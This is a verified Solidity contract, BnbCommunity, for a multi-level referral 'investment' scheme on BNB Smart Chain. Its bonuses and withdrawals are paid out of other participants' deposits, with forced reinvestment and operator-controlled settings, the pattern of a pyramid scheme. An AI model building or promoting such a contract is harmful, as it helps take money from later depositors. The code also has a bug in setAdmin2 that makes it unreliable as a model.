/**
 *Submitted for verification at BscScan.com on 2022-02-15
*/

/**
 *Submitted for verification at BscScan.com on 2021-08-21
 */

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.12;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


contract BnbCommunity {
    using SafeMath for uint256;
    using SafeMath for uint8;

    uint256 public constant PROJECT_FEE = 10; 
    uint256 public constant PERCENTS_DIVIDER = 100;
    uint256 public totalUsers;
    uint256 public totalInvested;
    uint256 public totalWithdrawn;
    uint256 public totalDeposits;
    uint256 public deposit;
    uint256[15] public ref_bonuses = [8,24,3,3,3,3,3,3,3,7,2,2,2,2,2];
    string public officialAnnouncement;
    string public website;
    string public officialEmail;
    string public contactUsOne;
    string public contactUsTwo;
    string public contactUsThree;
    string public github;

    uint256[7] public defaultPackages = [0.1 ether,0.2 ether,0.4 ether,0.6 ether,1 ether,4 ether,10 ether];

    mapping(uint256 => address payable) public singleLeg;
    uint256 public singleLegLength;
    uint256[15] public requiredDirect = [1,1,3,3,3,6,6,6,6,9,9,9,12,12,12];
    mapping(address => address ) public nextBigInvestors;
    uint256 public bigInvestorsLength;
    address constant GUARD = address(1);


    address payable public admin;
    address payable public admin2;

    struct User {
        uint256 amount;
        uint256 checkpoint;
        address referrer;
        uint256 referrerBonus;
        uint256 totalWithdrawn;
        uint256 totalReferrer;
        uint256 singleUplineBonusTaken;
        uint256 singleDownlineBonusTaken;
        address singleUpline;
        address singleDownline;
        uint256 bigInvestorBonusTakenTime;
        uint256 bigInvestorBonusTakenBlockNumber;
        uint256[15] refStageIncome;
        uint256[15] refStageBonus;
        uint256[15] refs;
    }

    mapping(address => User) public users;
    mapping(address => mapping(uint256 => address)) public downline; 

    event NewDeposit(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event FeePayed(address indexed user, uint256 totalAmount);

    constructor(address payable _admin, address payable _admin2) public {
        require(!isContract(_admin));
        admin = _admin;
        admin2 = _admin2;
        singleLeg[0] = admin;
        singleLegLength++;
        nextBigInvestors[GUARD] = GUARD;
        nextBigInvestors[admin] = nextBigInvestors[GUARD];
        nextBigInvestors[GUARD] = admin;
        bigInvestorsLength++;
    }

    function bigInvestorsBonus() public {
        User storage _user = users[msg.sender];
        if ((nextBigInvestors[msg.sender] != address(0))&&(block.number >= _user.bigInvestorBonusTakenBlockNumber.add(86400))&&(block.timestamp >= _user.bigInvestorBonusTakenTime.add(86400))) {
            if ((msg.sender==admin)||(_user.amount >= defaultPackages[6])){
            _user.referrerBonus = _user.referrerBonus.add(deposit.div(bigInvestorsLength));
            deposit = deposit.sub(deposit.div(bigInvestorsLength));
            _user.bigInvestorBonusTakenBlockNumber = block.number;
            _user.bigInvestorBonusTakenTime = block.timestamp;
         }
        }
    }

    function _refPayout(address _addr, uint256 _amount) internal {
        address up = users[_addr].referrer;
        uint256 theBonus;
        for (uint8 i = 0; i < ref_bonuses.length; i++) {
            if (up == address(0)) break;
            if (users[up].refs[0] >= requiredDirect[i]) {
                uint256 bonus = _amount.mul(ref_bonuses[i]).div(
                    PERCENTS_DIVIDER
                );
                theBonus = theBonus.add(bonus);
                users[up].referrerBonus = users[up].referrerBonus.add(bonus);
                users[up].refStageBonus[i] = users[up].refStageBonus[i].add(
                    bonus
                );
            }
            up = users[up].referrer;
        }
        deposit = deposit.add(_amount.sub(theBonus).sub(_amount.mul(30).div(PERCENTS_DIVIDER)));
    }


    function invest(address referrer) public payable {
        require(
            msg.value >= defaultPackages[0],
            "The minimum investment not reached"
        );

        User storage user = users[msg.sender];

        if (
            user.referrer == address(0) &&
            (users[referrer].checkpoint > 0 || referrer == admin) &&
            referrer != msg.sender
        ) {
            user.referrer = referrer;
        }

        require(
            user.referrer != address(0) || msg.sender == admin,
            "No upline"
        );

        // setup upline
        if (user.checkpoint == 0) {
            singleLeg[singleLegLength] = msg.sender;
            user.singleUpline = singleLeg[singleLegLength - 1];
            users[singleLeg[singleLegLength - 1]].singleDownline = msg.sender;
            singleLegLength++;
        }

        if (user.referrer != address(0)) {
            // unilevel level count
            address upline = user.referrer;
            for (uint256 i = 0; i < ref_bonuses.length; i++) {
                if (upline != address(0)) {
                    users[upline].refStageIncome[i] = users[upline]
                        .refStageIncome[i]
                        .add(msg.value);
                    if (user.checkpoint == 0) {
                        users[upline].refs[i] = users[upline].refs[i].add(1);
                        users[upline].totalReferrer++;
                    }
                    upline = users[upline].referrer;
                } else break;
            }

            if (user.checkpoint == 0) {
                // unilevel downline setup
                downline[referrer][users[referrer].refs[0] - 1] = msg.sender;
            }
        }

        uint256 msgValue = msg.value;

        // Level Referral
        _refPayout(msg.sender, msgValue);

        if (user.checkpoint == 0) {
            totalUsers = totalUsers.add(1);
        }
        user.amount += msg.value;
        user.checkpoint = block.timestamp;

        totalInvested = totalInvested.add(msg.value);
        totalDeposits = totalDeposits.add(1);

        if (user.amount >= defaultPackages[6]) {
            if (nextBigInvestors[msg.sender] == address(0)) {
                nextBigInvestors[msg.sender] = nextBigInvestors[GUARD];
                nextBigInvestors[GUARD] = msg.sender;
                bigInvestorsLength++;
            }
        }

        emit NewDeposit(msg.sender, msg.value);
    }

    function reinvest(address _user, uint256 _amount) private {
        User storage user = users[_user];
        user.amount += _amount;
        totalInvested = totalInvested.add(_amount);
        totalDeposits = totalDeposits.add(1);

        //////
        address up = user.referrer;
        for (uint256 i = 0; i < ref_bonuses.length; i++) {
            if (up == address(0)) break;
            if (users[up].refs[0] >= requiredDirect[i]) {
                users[up].refStageIncome[i] = users[up].refStageIncome[i].add(
                    _amount
                );
            }
            up = users[up].referrer;
        }
        ///////

        if (user.amount >= defaultPackages[6]) {
            if (nextBigInvestors[_user] == address(0)) {
                nextBigInvestors[_user] = nextBigInvestors[GUARD];
                nextBigInvestors[GUARD] = _user;
                bigInvestorsLength++;
            }
        }

        _refPayout(msg.sender, _amount);
    }

    function withdrawal() external {
        User storage _user = users[msg.sender];

        uint256 TotalBonus = TotalBonus(msg.sender);

        uint256 _fees = TotalBonus.mul(PROJECT_FEE.div(2)).div(
            PERCENTS_DIVIDER
        );
        uint256 actualAmountToSend = TotalBonus.sub(_fees);
        _user.referrerBonus = 0;

        uint256 uplineIncomeByUserId = GetUplineIncomeByUserId(msg.sender);
        uint256 downlineIncomeByUserId = GetDownlineIncomeByUserId(msg.sender);
        if  ((uplineIncomeByUserId > users[msg.sender].singleUplineBonusTaken) && (downlineIncomeByUserId > users[msg.sender].singleDownlineBonusTaken)) {
        _user.singleUplineBonusTaken = uplineIncomeByUserId;
        _user.singleDownlineBonusTaken = downlineIncomeByUserId;
        }


        // re-invest

        (uint8 reivest, uint8 withdrwal) = getEligibleWithdrawal(msg.sender);
        reinvest(msg.sender, actualAmountToSend.mul(reivest).div(100));

        _user.totalWithdrawn = _user.totalWithdrawn.add(
            actualAmountToSend.mul(withdrwal).div(100)
        );
        totalWithdrawn = totalWithdrawn.add(
            actualAmountToSend.mul(withdrwal).div(100)
        );

        _safeTransfer(msg.sender, actualAmountToSend.mul(withdrwal).div(100));
        _safeTransfer(admin2, _fees);
        emit Withdrawn(msg.sender, actualAmountToSend.mul(withdrwal).div(100));
    }

    function GetUplineIncomeByUserId(address _user)
        public
        view
        returns (uint256)
    {
        (uint256 maxLevel, ) = getEligibleLevelCountForUpline(_user);
        address upline = users[_user].singleUpline;
        uint256 bonus;
        for (uint256 i = 0; i < maxLevel; i++) {
            if (upline != address(0)) {
                bonus = bonus.add(users[upline].amount.mul(3).div(1000));
                upline = users[upline].singleUpline;
            } else break;
        }

        return bonus;
    }

    function GetDownlineIncomeByUserId(address _user)
        public
        view
        returns (uint256)
    {
        (, uint256 maxLevel) = getEligibleLevelCountForUpline(_user);
        address upline = users[_user].singleDownline;
        uint256 bonus;
        for (uint256 i = 0; i < maxLevel; i++) {
            if (upline != address(0)) {
                bonus = bonus.add(users[upline].amount.mul(3).div(1000));
                upline = users[upline].singleDownline;
            } else break;
        }

        return bonus;
    }

    function getEligibleLevelCountForUpline(address _user) public view returns (uint8 uplineCount, uint8 downlineCount){
        uint256 TotalDeposit = users[_user].amount;
        if (
            TotalDeposit >= defaultPackages[0] &&
            TotalDeposit < defaultPackages[1]
        ) {
            uplineCount = 20;
            downlineCount = 30;
        } else if (
            TotalDeposit >= defaultPackages[1] &&
            TotalDeposit < defaultPackages[2]
        ) {
            uplineCount = 24;
            downlineCount = 36;
        } else if (
            TotalDeposit >= defaultPackages[2] &&
            TotalDeposit < defaultPackages[3]
        ) {
            uplineCount = 28;
            downlineCount = 42;
        } else if (
            TotalDeposit >= defaultPackages[3] &&
            TotalDeposit < defaultPackages[4]
        ) {
            uplineCount = 32;
            downlineCount = 48;
        } else if (TotalDeposit >= defaultPackages[4]) {
            uplineCount = 40;
            downlineCount = 60;
        }

        return (uplineCount, downlineCount);
    }

    function getEligibleWithdrawal(address _user) public view returns (uint8 reivest, uint8 withdrwal)
    {
        uint256 TotalDeposit = users[_user].amount;
        if (
            users[_user].refs[0] >= 6 &&
            (TotalDeposit >= defaultPackages[4] &&
                TotalDeposit < defaultPackages[5])
        ) {
            reivest = 50;
            withdrwal = 50;
        } else if (
            users[_user].refs[0] >= 3 &&
            (TotalDeposit >= defaultPackages[5] &&
                TotalDeposit < defaultPackages[6])
        ) {
            reivest = 40;
            withdrwal = 60;
        } else if (TotalDeposit >= defaultPackages[6]) {
            reivest = 30;
            withdrwal = 70;
        } else {
            reivest = 60;
            withdrwal = 40;
        }

        return (reivest, withdrwal);
    }

        function TotalBonus(address _user) public view returns (uint256) {
        uint256 uplineIncome = GetUplineIncomeByUserId(_user);
        uint256 downlineIncom = GetDownlineIncomeByUserId(_user);
        if ((uplineIncome > users[_user].singleUplineBonusTaken) && (downlineIncom > users[_user].singleDownlineBonusTaken)) {
            uint256 TotalEarn = users[_user].referrerBonus.add(uplineIncome).add(downlineIncom);
            uint256 TotalTakenfromUpDown = users[_user].singleDownlineBonusTaken.add(users[_user].singleUplineBonusTaken);
            return TotalEarn.sub(TotalTakenfromUpDown);
        } else {
            return users[_user].referrerBonus;
        }

    }

    function referral_stage(address _user, uint256 _index)
        external
        view
        returns (
            uint256 _noOfUser,
            uint256 _investment,
            uint256 _bonus
        )
    {
        return (
            users[_user].refs[_index],
            users[_user].refStageIncome[_index],
            users[_user].refStageBonus[_index]
        );
    }

    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }
    //Renew the minimum investment if the price of BNB keeps rising.
    function setDefaulPackages(uint8 package) public {
        require(msg.sender == admin);
        if (package == 1) {
            defaultPackages = [0.2 ether,0.4 ether,0.8 ether,1.2 ether,2 ether,8 ether,20 ether];
        } else if (package == 2) {
            defaultPackages = [0.1 ether,0.2 ether,0.4 ether,0.6 ether,1 ether,4 ether,10 ether];
        } else if (package == 3) {
            defaultPackages = [0.05 ether,0.1 ether,0.2 ether,0.3 ether,0.5 ether,2 ether,5 ether];
        } else if (package == 4) {
            defaultPackages = [0.025 ether,0.05 ether,0.1 ether,0.15 ether,0.25 ether,1 ether,2.5 ether];
        } else if (package == 5) {
            defaultPackages = [0.0125 ether,0.025 ether,0.05 ether,0.075 ether,0.125 ether,0.5 ether,1.25 ether];
        } else if (package == 6) {
            defaultPackages = [0.00625 ether,0.0125 ether,0.025 ether,0.0375 ether,0.0625 ether,0.25 ether,0.625 ether];
        } else if (package == 7) {
            defaultPackages = [0.003125 ether,0.00625 ether,0.0125 ether,0.01875 ether,0.03125 ether,0.125 ether,0.3125 ether];
        } else if (package == 8) {
            defaultPackages = [0.0015625 ether,0.003125 ether,0.00625 ether,0.009375 ether,0.015625 ether,0.0625 ether,0.15625 ether];
        } else if (package == 9) {
            defaultPackages = [0.00078125 ether,0.0015625 ether,0.003125 ether,0.0046875 ether,0.0078125 ether,0.03125 ether,0.078125 ether];
        } else if (package == 10) {
            defaultPackages = [0.4 ether,0.8 ether,1.6 ether,2.4 ether,4 ether,16 ether,40 ether];
        }
    }

    function setAdmin(address payable _setAdmin) public {
        require(msg.sender == admin);
        admin = _setAdmin;
    }

    function setAdmin2(address payable _setAdmin2) public {
        require(msg.sender == admin);
        admin = _setAdmin2;
    }

    function setWebsite(string memory _website) public {
        require(msg.sender == admin);
        website = _website;
    }

    function setContactUsOne(string memory _contactUsOne) public {
        require(msg.sender == admin);
        contactUsOne = _contactUsOne;
    }

    function setContactUsTwo(string memory _contactUsTwo) public {
        require(msg.sender == admin);
        contactUsTwo = _contactUsTwo;
    }

    function setContactUsThree(string memory _contactUsThree) public {
        require(msg.sender == admin);
        contactUsThree = _contactUsThree;
    }

    function setOfficialAnnouncement(string memory _officialAnnouncement) public{
        require(msg.sender == admin);
        officialAnnouncement = _officialAnnouncement;
    }

    function setOfficialEmail(string memory _officialEmail) public {
        require(msg.sender == admin);
        officialEmail = _officialEmail;
    }

    function _safeTransfer(address payable _to, uint _amount) internal returns (uint256 amount) {
        amount = (_amount < address(this).balance) ? _amount : address(this).balance;
       _to.transfer(amount);
   }
   
    function setGithub(string memory _github) public {
        require(msg.sender == admin);
        github = _github;
    }
}